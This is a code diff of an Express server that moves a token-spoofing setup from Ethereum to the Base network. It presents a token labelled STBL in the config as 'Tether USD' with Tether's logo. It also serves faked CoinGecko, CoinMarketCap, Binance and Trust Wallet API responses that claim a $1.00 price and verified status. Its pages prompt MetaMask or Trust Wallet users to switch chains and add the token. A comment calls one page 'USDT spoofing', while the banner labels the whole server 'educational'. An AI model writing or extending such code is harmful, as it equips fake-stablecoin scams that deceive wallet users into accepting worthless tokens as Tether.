@@ -1,4 +1,4 @@
-// app.js - Complete implementation with Ethereum & Trust Wallet support
+// app.js - Complete implementation with Base Network & Trust Wallet support
 const express = require('express');
 const cors = require('cors');
 const http = require('http');
@@ -14,33 +14,33 @@ const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
 // =========================================================
-// TOKEN CONFIGURATION - ETHEREUM FOCUSED
+// TOKEN CONFIGURATION - BASE NETWORK FOCUSED
 // =========================================================
 const TOKEN_CONFIG = {
-  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // Real USDT address on Ethereum
+  address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',  // STBL address on Base
   displaySymbol: 'USDT', // Display symbol for UI and wallet
   displayName: 'Tether USD', // Display name for UI and wallet
-  decimals: 6,  // 6 decimals is standard for USDT
+  decimals: 18,  // 18 decimals for STBL token
   image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-  networkName: 'Ethereum',
-  networkId: '0x1',  // Ethereum Mainnet Chain ID (1)
-  chainId: 1,        // Numeric chain ID
-  nativeChain: "ethereum", // Explicitly state this is an Ethereum token
-  isNative: true,    // Token is native to Ethereum chain
-  rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-  blockExplorerUrl: 'https://etherscan.io',
+  networkName: 'Base',
+  networkId: '0x2105',  // Base Chain ID (8453 in hex)
+  chainId: 8453,        // Base numeric chain ID
+  nativeChain: "base", // Explicitly state this is a Base token
+  isNative: true,    // Token is native to Base chain
+  rpcUrl: 'https://mainnet.base.org',
+  blockExplorerUrl: 'https://basescan.org',
   coinGeckoId: 'tether',
   coinMarketCapId: '825'
 };
 
-// Trust Wallet specific configuration
+// Trust Wallet specific configuration - updated for Base
 const TRUST_WALLET_CONFIG = {
   displaySymbol: 'USDT',
   displayName: 'Tether USD',
-  trustAssetId: 'c2/7859-1',
-  trustAssetDecimals: 6,
+  trustAssetId: 'c2/8453-1', // Updated for Base chain ID
+  trustAssetDecimals: 18, // Match STBL decimals
   trustAssetLogoUrl: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-  trustWalletDeepLink: 'trust://ethereum/asset/' + TOKEN_CONFIG.address + '?coin=1',
+  trustWalletDeepLink: 'trust://base/asset/' + TOKEN_CONFIG.address + '?coin=8453', // Updated for Base
   // Binance API data (Trust Wallet uses Binance APIs)
   binanceEndpoints: {
     price: '/api/binance/api/v3/ticker/price',
@@ -120,16 +120,16 @@ function generateDeterministicBalance(address) {
   }
 }
 
-// Function to get actual token balance from the blockchain
+// Function to get actual token balance from the blockchain - updated for Base
 async function getActualTokenBalance(address) {
   try {
     // Validate address format
     if (!ethers.utils.isAddress(address)) {
-      console.error("Invalid Ethereum address format:", address);
+      console.error("Invalid address format:", address);
       return null;
     }
     
-    // Connect to Ethereum network using the configured RPC URL
+    // Connect to Base network using the configured RPC URL
     const provider = new ethers.providers.JsonRpcProvider(TOKEN_CONFIG.rpcUrl);
     
     // ERC20 ABI for balanceOf function
@@ -210,7 +210,7 @@ const priceCacheWarmer = {
         
         // CoinGecko endpoints
         "/api/v3/simple/price?ids=tether&vs_currencies=usd",
-        "/api/v3/coins/ethereum/contract/" + TOKEN_CONFIG.address.toLowerCase(),
+        "/api/v3/coins/base/contract/" + TOKEN_CONFIG.address.toLowerCase(), // Updated to 'base'
         "/api/v3/coins/markets?vs_currency=usd&ids=tether",
         
         // Generic endpoints
@@ -399,7 +399,7 @@ app.get('/health', (req, res) => {
     status: 'ok',
     timestamp: new Date().toISOString(),
     version: '1.0.0',
-    ethereum: true
+    base: true // Updated to indicate Base network
   });
 });
 
@@ -445,7 +445,7 @@ app.get('/api/token-balance/:address', async (req, res) => {
     
     // Basic validation to catch obviously invalid addresses
     if (!address || address.length !== 42 || !address.startsWith('0x')) {
-      return res.status(400).json({ error: 'Invalid Ethereum address format' });
+      return res.status(400).json({ error: 'Invalid address format' });
     }
     
     // Try to get the actual balance from the blockchain first
@@ -462,8 +462,8 @@ app.get('/api/token-balance/:address', async (req, res) => {
       rawBalanceInSmallestUnit = Math.floor(parseFloat(formattedBalance) * factor).toString();
     } catch (error) {
       console.error('Error calculating raw balance:', error);
-      // Fallback to safe default (10 USDT with 6 decimals)
-      rawBalanceInSmallestUnit = "10000000";
+      // Fallback to safe default (10 USDT with 18 decimals)
+      rawBalanceInSmallestUnit = "10000000000000000000";
     }
     
     // Return consistent response with more fields
@@ -488,7 +488,7 @@ app.get('/api/token-balance/:address', async (req, res) => {
       address: req.params.address,
       token: TOKEN_CONFIG.address,
       tokenSymbol: TOKEN_CONFIG.displaySymbol,
-      rawBalance: "10000000", // Default fallback (10 USDT)
+      rawBalance: "10000000000000000000", // Default fallback (10 USDT with 18 decimals)
       formattedBalance: "10.00",
       valueUSD: "10.00",
       tokenDecimals: TOKEN_CONFIG.decimals,
@@ -609,6 +609,7 @@ app.get('/api/simple/price', (req, res) => {
 });
 
 // Contract data endpoint - This is what MetaMask uses to check token details
+// Updated for Base network
 app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
   try {
     const { chain, address } = req.params;
@@ -620,13 +621,13 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
         id: "tether",
         symbol: "usdt", // Return USDT symbol
         name: "Tether USD", // Return Tether name
-        asset_platform_id: "ethereum", // Explicitly state Ethereum
-        blockchain: "ethereum",
+        asset_platform_id: "base", // Updated to Base
+        blockchain: "base", // Updated to Base
         platforms: {
-          "ethereum": TOKEN_CONFIG.address
+          "base": TOKEN_CONFIG.address
         },
         detail_platforms: {
-          "ethereum": {
+          "base": {
             decimal_place: TOKEN_CONFIG.decimals,
             contract_address: TOKEN_CONFIG.address
           }
@@ -666,8 +667,8 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
       id: "tether",
       symbol: "usdt",
       name: "Tether USD",
-      asset_platform_id: "ethereum",
-      blockchain: "ethereum",
+      asset_platform_id: "base",
+      blockchain: "base",
       market_data: {
         current_price: {
           usd: 1.00
@@ -799,11 +800,20 @@ app.get('/api/coins/:id/market_chart', (req, res) => {
   app._router.handle(req, res);
 });
 
-// Route for CoinGecko asset platforms (networks)
+// Route for CoinGecko asset platforms (networks) - Updated for Base
 app.get('/api/v3/asset_platforms', (req, res) => {
   try {
-    // Return data that includes Ethereum network
+    // Return data that includes Base network
     res.json([
+      {
+        id: "base",
+        chain_identifier: 8453,
+        name: "Base",
+        shortname: "BASE",
+        native_coin_id: "ethereum",
+        categories: ["Layer 2"]
+      },
+      // Include other networks for completeness
       {
         id: "ethereum",
         chain_identifier: 1,
@@ -812,7 +822,6 @@ app.get('/api/v3/asset_platforms', (req, res) => {
         native_coin_id: "ethereum",
         categories: ["Layer 1"]
       },
-      // Include other networks for completeness
       {
         id: "polygon-pos",
         chain_identifier: 137,
@@ -820,23 +829,15 @@ app.get('/api/v3/asset_platforms', (req, res) => {
         shortname: "MATIC",
         native_coin_id: "matic-network",
         categories: ["Layer 2"]
-      },
-      {
-        id: "optimism",
-        chain_identifier: 10,
-        name: "Optimism",
-        shortname: "OP",
-        native_coin_id: "ethereum",
-        categories: ["Layer 2"]
       }
     ]);
   } catch (error) {
     console.error('Asset platforms error:', error);
     // Return minimal data on error
     res.json([{
-      id: "ethereum",
-      chain_identifier: 1,
-      name: "Ethereum"
+      id: "base",
+      chain_identifier: 8453,
+      name: "Base"
     }]);
   }
 });
@@ -869,7 +870,7 @@ app.get('/api/v1/assets/:address', (req, res) => {
         whitepaper: "https://tether.to/en/whitepaper/",
         explorers: [
           {
-            name: "Etherscan",
+            name: "BaseScan",
             url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
           }
         ],
@@ -907,7 +908,7 @@ app.get('/api/v1/assets/:address', (req, res) => {
           decimals: TOKEN_CONFIG.decimals,
           protocol: "erc20"
         },
-        platform: "ethereum",
+        platform: "base", // Updated to Base
         categories: ["Stablecoins"],
         is_stablecoin: true,
         is_verified: true,
@@ -1029,7 +1030,7 @@ app.get('/api/v3/ticker/24hr', (req, res) => {
   }
 });
 
-// Trust Wallet token list endpoint
+// Trust Wallet token list endpoint - Updated for Base
 app.get('/api/v1/tokenlist', (req, res) => {
   try {
     res.json({
@@ -1038,7 +1039,7 @@ app.get('/api/v1/tokenlist', (req, res) => {
       timestamp: new Date().toISOString(),
       tokens: [
         {
-          chainId: 1,
+          chainId: TOKEN_CONFIG.chainId, // Base chainId (8453)
           address: TOKEN_CONFIG.address,
           name: TRUST_WALLET_CONFIG.displayName,
           symbol: TRUST_WALLET_CONFIG.displaySymbol,
@@ -1060,7 +1061,7 @@ app.get('/api/v1/tokenlist', (req, res) => {
       name: "Trust Wallet Token List",
       tokens: [
         {
-          chainId: 1,
+          chainId: TOKEN_CONFIG.chainId,
           address: TOKEN_CONFIG.address,
           name: TRUST_WALLET_CONFIG.displayName,
           symbol: TRUST_WALLET_CONFIG.displaySymbol,
@@ -1072,8 +1073,8 @@ app.get('/api/v1/tokenlist', (req, res) => {
   }
 });
 
-// Trust Wallet asset repository structure
-app.get('/assets/blockchains/ethereum/assets/:address/info.json', (req, res) => {
+// Trust Wallet asset repository structure - updated for Base
+app.get('/assets/blockchains/base/assets/:address/info.json', (req, res) => {
   try {
     const { address } = req.params;
     
@@ -1115,7 +1116,7 @@ app.get('/assets/blockchains/ethereum/assets/:address/info.json', (req, res) => 
 });
 
 // Trust Wallet asset logo
-app.get('/assets/blockchains/ethereum/assets/:address/logo.png', (req, res) => {
+app.get('/assets/blockchains/base/assets/:address/logo.png', (req, res) => {
   res.redirect(TOKEN_CONFIG.image);
 });
 
@@ -1214,10 +1215,10 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
             circulating_supply: 83500000000,
             total_supply: 83500000000,
             platform: {
-              id: 1027,
-              name: "Ethereum",
+              id: 8453,
+              name: "Base",
               symbol: "ETH",
-              slug: "ethereum",
+              slug: "base",
               token_address: TOKEN_CONFIG.address
             },
             is_active: 1,
@@ -1275,27 +1276,27 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
 // DEEP LINKING ENDPOINTS
 // =========================================================
 
-// MetaMask deep link generator
+// MetaMask deep link generator - updated for Base
 app.get('/api/deeplink/metamask', (req, res) => {
-  const deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1";
+  const deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453";
   res.json({ deepLink });
 });
 
-// Trust Wallet deep link generator
+// Trust Wallet deep link generator - updated for Base
 app.get('/api/deeplink/trustwallet', (req, res) => {
-  const deepLink = "trust://ethereum/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=1";
+  const deepLink = "trust://base/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=8453";
   res.json({ deepLink });
 });
 
-// Generic wallet selection deep link
+// Generic wallet selection deep link - updated for Base
 app.get('/api/deeplink', (req, res) => {
   const wallet = req.query.wallet || 'metamask';
   
   let deepLink;
   if (wallet.toLowerCase() === 'trust' || wallet.toLowerCase() === 'trustwallet') {
-    deepLink = "trust://ethereum/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=1";
+    deepLink = "trust://base/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=8453";
   } else {
-    deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1";
+    deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453";
   }
   
   res.json({ deepLink });
@@ -1305,7 +1306,7 @@ app.get('/api/deeplink', (req, res) => {
 // MOBILE ROUTES & HTML TEMPLATES
 // =========================================================
 
-// Direct token addition page - simplified, focused version with enhanced network switching
+// Direct token addition page - simplified, focused version with Base network
 app.get('/token-add-direct', (req, res) => {
   const html = `
 <!DOCTYPE html>
@@ -1363,26 +1364,58 @@ app.get('/token-add-direct', (req, res) => {
       }
     })();
     
-    // Explicitly ensure we're on Ethereum Mainnet
-    async function ensureEthereumNetwork() {
+    // Explicitly ensure we're on Base Network
+    async function ensureBaseNetwork() {
       try {
         const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        // If not on Ethereum Mainnet (0x1), force switch
-        if (chainId !== '0x1') {
-          console.log("Not on Ethereum Mainnet, switching...");
+        // If not on Base (0x2105), force switch
+        if (chainId !== '0x2105') {
+          console.log("Not on Base Network, switching...");
           try {
             await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x1' }], // Ethereum Mainnet
+              params: [{ chainId: '0x2105' }], // Base Network
             });
-            console.log("Successfully switched to Ethereum Mainnet");
+            console.log("Successfully switched to Base Network");
             return true;
           } catch (switchError) {
-            console.error("Failed to switch network:", switchError);
-            return false;
+            // If Base isn't added to MetaMask yet, add it
+            if (switchError.code === 4902) {
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: '0x2105',
+                    chainName: 'Base',
+                    nativeCurrency: {
+                      name: 'ETH',
+                      symbol: 'ETH',
+                      decimals: 18
+                    },
+                    rpcUrls: ['https://mainnet.base.org'],
+                    blockExplorerUrls: ['https://basescan.org']
+                  }]
+                });
+                
+                // Try switching again after adding
+                await window.ethereum.request({
+                  method: 'wallet_switchEthereumChain',
+                  params: [{ chainId: '0x2105' }],
+                });
+                
+                console.log("Added and switched to Base Network");
+                return true;
+              } catch (addError) {
+                console.error("Failed to add Base Network:", addError);
+                return false;
+              }
+            } else {
+              console.error("Failed to switch network:", switchError);
+              return false;
+            }
           }
         } else {
-          console.log("Already on Ethereum Mainnet");
+          console.log("Already on Base Network");
           return true;
         }
       } catch (error) {
@@ -1457,10 +1490,10 @@ app.get('/token-add-direct', (req, res) => {
       try {
         console.log("Trying direct token addition method...");
         
-        // Ensure we're on Ethereum network first
-        const networkReady = await ensureEthereumNetwork();
+        // Ensure we're on Base network first
+        const networkReady = await ensureBaseNetwork();
         if (!networkReady) {
-          throw new Error("Could not ensure Ethereum network");
+          throw new Error("Could not ensure Base network");
         }
         
         // First ensure accounts are accessible
@@ -1502,12 +1535,12 @@ app.get('/token-add-direct', (req, res) => {
       }
     }
     
-    // Function to switch to Ethereum network
-    async function switchToEthereum() {
+    // Function to switch to Base network
+    async function switchToBaseNetwork() {
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x1' }], // Ethereum Mainnet
+          params: [{ chainId: '0x2105' }], // Base
         });
         
         // Wait a moment and try again
@@ -1564,9 +1597,25 @@ app.get('/token-add-direct', (req, res) => {
     
     document.addEventListener('DOMContentLoaded', () => {
       const switchNetworkBtn = document.getElementById('switchNetworkBtn');
-      switchNetworkBtn.addEventListener('click', switchToEthereum);
+      switchNetworkBtn.addEventListener('click', switchToBaseNetwork);
       
+      // Start token addition with a short delay
       setTimeout(addToken, 1000);
+      
+      // Add safety timeout (3 minutes)
+      const safetyTimeout = setTimeout(() => {
+        const statusDiv = document.getElementById('status');
+        if (statusDiv.textContent.includes("Adding") || statusDiv.textContent.includes("Preparing")) {
+          statusDiv.textContent = "Operation timed out after 3 minutes. Please try again.";
+          document.querySelector('.loader').style.display = 'none';
+          document.querySelector('button').style.display = 'block';
+        }
+      }, 180000); // 3 minutes to match the main file
+      
+      // Clear timeout if page is unloaded
+      window.addEventListener('beforeunload', () => {
+        clearTimeout(safetyTimeout);
+      });
     });
   </script>
   <style>
@@ -1634,10 +1683,10 @@ app.get('/token-add-direct', (req, res) => {
   <p>Please approve the request in your wallet.</p>
   <div id="networkError" style="display:none">
     This token is not compatible with your current network.<br>
-    Try switching to Ethereum or another EVM network.
+    Try switching to Base network.
   </div>
   <div id="status">Initializing...</div>
-  <button id="switchNetworkBtn" style="display:none">Switch to Ethereum Mainnet</button>
+  <button id="switchNetworkBtn" style="display:none">Switch to Base Network</button>
   <button onclick="addToken()">Try Again</button>
 </body>
 </html>
@@ -1646,7 +1695,7 @@ app.get('/token-add-direct', (req, res) => {
   res.send(html);
 });
 
-// Mobile-optimized token addition page with USDT spoofing
+// Mobile-optimized token addition page with USDT spoofing - updated for Base
 app.get('/mobile/add-token', (req, res) => {
   const host = req.get('host');
   const protocol = req.protocol;
@@ -1711,31 +1760,64 @@ app.get('/mobile/add-token', (req, res) => {
       }
     })();
     
-    // Ensure we're on Ethereum Mainnet
-    async function ensureEthereumNetwork() {
+    // Ensure we're on Base Network
+    async function ensureBaseNetwork() {
       try {
         if (!window.ethereum) return false;
         
         const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        // If not on Ethereum Mainnet (0x1), force switch
-        if (chainId !== '0x1') {
-          console.log("Not on Ethereum Mainnet, switching...");
+        // If not on Base (0x2105), force switch
+        if (chainId !== '0x2105') {
+          console.log("Not on Base Network, switching...");
           try {
             await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x1' }], // Ethereum Mainnet
+              params: [{ chainId: '0x2105' }], // Base
             });
-            console.log("Successfully switched to Ethereum Mainnet");
+            console.log("Successfully switched to Base Network");
             
             // Give the wallet a moment to update
             await new Promise(resolve => setTimeout(resolve, 1000));
             return true;
           } catch (switchError) {
-            console.error("Failed to switch network:", switchError);
-            return false;
+            // If Base isn't added to MetaMask yet, add it
+            if (switchError.code === 4902) {
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: '0x2105',
+                    chainName: 'Base',
+                    nativeCurrency: {
+                      name: 'ETH',
+                      symbol: 'ETH',
+                      decimals: 18
+                    },
+                    rpcUrls: ['https://mainnet.base.org'],
+                    blockExplorerUrls: ['https://basescan.org']
+                  }]
+                });
+                
+                // Try switching again after adding
+                await window.ethereum.request({
+                  method: 'wallet_switchEthereumChain',
+                  params: [{ chainId: '0x2105' }],
+                });
+                
+                // Give the wallet a moment to update
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                return true;
+              } catch (addError) {
+                console.error("Failed to add Base Network:", addError);
+                return false;
+              }
+            } else {
+              console.error("Failed to switch network:", switchError);
+              return false;
+            }
           }
         } else {
-          console.log("Already on Ethereum Mainnet");
+          console.log("Already on Base Network");
           return true;
         }
       } catch (error) {
@@ -1783,7 +1865,7 @@ app.get('/mobile/add-token', (req, res) => {
   <div class="container">
     <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" style="width: 80px; height: 80px; margin-bottom: 16px;">
     <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center;">Add USDT to Your Wallet</h1>
-    <p style="font-size: 16px; color: #666; margin-bottom: 24px; text-align: center;">Tether USD on Ethereum</p>
+    <p style="font-size: 16px; color: #666; margin-bottom: 24px; text-align: center;">Tether USD on Base</p>
     
     <button id="addBtn" class="add-btn">Add to MetaMask</button>
     
@@ -1793,7 +1875,7 @@ app.get('/mobile/add-token', (req, res) => {
     </div>
     
     <div id="networkError" style="display: none; color: #e74c3c; margin: 20px 0; text-align: center;">
-      Please switch to Ethereum network in your wallet settings
+      Please switch to Base network in your wallet settings
     </div>
     
     <div style="margin-top: 24px; background-color: #f8f8f8; border-radius: 12px; padding: 16px; width: 100%; max-width: 300px;">
@@ -1808,20 +1890,29 @@ app.get('/mobile/add-token', (req, res) => {
   </div>
   
   <script>
-    // Basic implementation for the Add button
+    // Enhanced Add button implementation with timeout
     document.getElementById('addBtn').addEventListener('click', async function() {
       // Show loading spinner
-      document.getElementById('loading').style.display = 'flex';
+      const loadingElement = document.getElementById('loading');
+      loadingElement.style.display = 'flex';
       const networkError = document.getElementById('networkError');
       networkError.style.display = 'none';
+      
+      // Add safety timeout (3 minutes)
+      const safetyTimeout = setTimeout(() => {
+        loadingElement.style.display = 'none';
+        networkError.textContent = "Operation timed out after 3 minutes. Please try again.";
+        networkError.style.display = 'block';
+      }, 180000); // 3 minutes
       
       try {
         // If MetaMask is available in the browser, use direct method
         if (window.ethereum && window.ethereum.isMetaMask) {
-          // First make sure we're on Ethereum network
-          const networkReady = await ensureEthereumNetwork();
+          // First make sure we're on Base network
+          const networkReady = await ensureBaseNetwork();
           if (!networkReady) {
-            document.getElementById('loading').style.display = 'none';
+            clearTimeout(safetyTimeout);
+            loadingElement.style.display = 'none';
             networkError.style.display = 'block';
             return;
           }
@@ -1839,18 +1930,21 @@ app.get('/mobile/add-token', (req, res) => {
             }
           });
           
+          clearTimeout(safetyTimeout);
+          
           if (success) {
             window.location.href = '/mobile/success';
           } else {
-            document.getElementById('loading').style.display = 'none';
+            loadingElement.style.display = 'none';
           }
         } else {
           // For mobile browsers without MetaMask, use deep linking
           window.location.href = 'https://metamask.app.link/dapp/${host}/token-add-direct';
         }
       } catch (err) {
+        clearTimeout(safetyTimeout);
         console.error('Error adding token:', err);
-        document.getElementById('loading').style.display = 'none';
+        loadingElement.style.display = 'none';
         if (err.message && err.message.includes("not supported on network")) {
           networkError.style.display = 'block';
         }
@@ -1998,12 +2092,12 @@ server.listen(port, () => {
   console.log("Educational Token Display Server");
   console.log("======================================");
   console.log("Server running on port: " + port);
-  console.log("Token Display: USDT on Ethereum");
+  console.log("Token Display: USDT on Base");
   console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
   console.log("Token Contract: " + TOKEN_CONFIG.address);
   console.log("Decimals: " + TOKEN_CONFIG.decimals);
   console.log("API Health Check: http://localhost:" + port + "/api/token-info");
-  console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1");
+  console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453");
   console.log("======================================");
 });
 
